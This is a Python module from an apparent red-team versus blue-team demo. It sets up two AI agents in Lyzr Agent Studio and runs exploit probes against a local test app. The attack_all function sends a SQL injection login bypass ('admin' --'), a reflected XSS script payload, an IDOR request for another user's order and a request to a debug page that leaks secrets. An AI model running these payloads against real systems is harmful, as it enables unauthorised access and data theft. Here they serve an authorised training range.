"""Shared pieces: Lyzr brains, the attack toolkit, and the range client."""

from __future__ import annotations

import json
import os
import re
from pathlib import Path

import httpx
from dotenv import load_dotenv

ROOT = Path(__file__).resolve().parent.parent
load_dotenv(ROOT / ".env")

TARGET = os.getenv("TARGET_URL", "http://127.0.0.1:5055")
ADMIN_TOKEN = os.getenv("TARGET_ADMIN_TOKEN", "blue-team-local")
LYZR_BASE = os.getenv("LYZR_BASE_URL", "https://agent-prod.studio.lyzr.ai")
LYZR_KEY = os.getenv("LYZR_API_KEY", "")
LYZR_CACHE = ROOT / ".lyzr_agents.json"

BRAINS = {
    "red": {
        "name": "Diwali Red Team Analyst",
        "role": "Offensive security analyst on an authorised local test range",
        "goal": "Turn raw exploit evidence into a crisp, prioritised attack report",
        "instructions": (
            "You receive JSON evidence from real HTTP probes against a local test app. "
            "For each confirmed finding give: severity (Critical/High/Medium/Low), a one line impact "
            "written for a business owner, and the CWE id. Keep it under 120 words. Plain text, "
            "no markdown tables. Never invent findings that are not in the evidence."
        ),
    },
    "blue": {
        "name": "Diwali Blue Team Engineer",
        "role": "Defensive security engineer",
        "goal": "Fix each reported vulnerability with a minimal code patch and a detection rule",
        "instructions": (
            "You receive Red Team findings as JSON. For each finding reply with: the root cause in "
            "one sentence, a minimal Python/Flask fix as a short code snippet, and one detection rule "
            "(log signature or WAF rule). Be concise, under 200 words total."
        ),
    },
}


# ---------------------------------------------------------------- Lyzr
def _agent_ids() -> dict:
    ids = {}
    if LYZR_CACHE.exists():
        ids = json.loads(LYZR_CACHE.read_text())
    for k in BRAINS:
        env = os.getenv(f"LYZR_{k.upper()}_AGENT_ID")
        if env:
            ids[k] = env
    return ids


def ensure_lyzr_agents() -> dict:
    """Create the Red and Blue brains in Lyzr Agent Studio once, then reuse them."""
    ids = _agent_ids()
    if not LYZR_KEY:
        return ids
    for k, spec in BRAINS.items():
        if k in ids:
            continue
        r = httpx.post(
            f"{LYZR_BASE}/v3/agents/",
            headers={"x-api-key": LYZR_KEY, "Content-Type": "application/json"},
            json={
                "name": spec["name"],
                "description": spec["goal"],
                "agent_role": spec["role"],
                "agent_goal": spec["goal"],
                "agent_instructions": spec["instructions"],
                "provider_id": "openai",
                "model": "gpt-4o-mini",
                "temperature": 0.3,
                "top_p": 0.9,
                "llm_credential_id": "lyzr_openai",
                "features": [],
                "tools": [],
            },
            timeout=60,
        )
        r.raise_for_status()
        data = r.json()
        ids[k] = data.get("agent_id") or data.get("_id") or data.get("id")
        print(f"[lyzr] created {k} brain -> {ids[k]}")
    LYZR_CACHE.write_text(json.dumps(ids, indent=2))
    return ids


async def lyzr_think(brain: str, message: str, session: str) -> str:
    """Ask a Lyzr agent. Falls back to a plain summary so the demo never stalls."""
    ids = _agent_ids()
    if LYZR_KEY and brain in ids:
        try:
            async with httpx.AsyncClient(timeout=90) as c:
                r = await c.post(
                    f"{LYZR_BASE}/v3/inference/chat/",
                    headers={"x-api-key": LYZR_KEY, "Content-Type": "application/json"},
                    json={
                        "user_id": "diwali-band",
                        "agent_id": ids[brain],
                        "session_id": f"{ids[brain]}-{session}",
                        "message": message,
                    },
                )
                r.raise_for_status()
                return r.json().get("response", "").strip()
        except Exception as e:  # keep the room moving
            print(f"[lyzr] {brain} failed: {e}")
    return ""


# ---------------------------------------------------------------- range
def attack_all() -> list[dict]:
    """Run real exploits against the range. Returns one result per vuln."""
    out = []
    with httpx.Client(base_url=TARGET, timeout=10) as c:
        r = c.post("/login", json={"username": "admin' --", "password": "x"})
        ok = r.status_code == 200 and r.json().get("ok")
        out.append(dict(vuln="sqli_login", title="SQL injection in /login", cwe="CWE-89",
                        exploited=bool(ok), payload="username=admin' --",
                        evidence=r.text[:160]))

        p = "<script>alert('diya')</script>"
        r = c.get("/search", params={"q": p})
        out.append(dict(vuln="xss_search", title="Reflected XSS in /search", cwe="CWE-79",
                        exploited=p in r.text, payload=p, evidence=r.text[:160]))

        r = c.get("/api/orders/102", headers={"X-User-Id": "2"})
        out.append(dict(vuln="idor_orders", title="IDOR on /api/orders/<id>", cwe="CWE-639",
                        exploited=r.status_code == 200, payload="user 2 reads order 102",
                        evidence=r.text[:160]))

        r = c.get("/debug")
        out.append(dict(vuln="debug_leak", title="Secrets exposed on /debug", cwe="CWE-200",
                        exploited=r.status_code == 200 and "SECRET" in r.text,
                        payload="GET /debug", evidence=re.sub(r"sk_test_\w+", "sk_test_***", r.text[:160])))
    return out


def apply_patch(vulns: list[str]) -> dict:
    r = httpx.post(f"{TARGET}/admin/patch", headers={"X-Admin-Token": ADMIN_TOKEN},
                   json={"enable": vulns, "by": "blue-agent"}, timeout=10)
    r.raise_for_status()
    return r.json()


FINDINGS_RE = re.compile(r"```json\s*(\{.*?\})\s*```", re.S)


def extract_payload(text: str) -> dict | None:
    m = FINDINGS_RE.search(text or "")
    if not m:
        return None
    try:
        return json.loads(m.group(1))
    except json.JSONDecodeError:
        return None
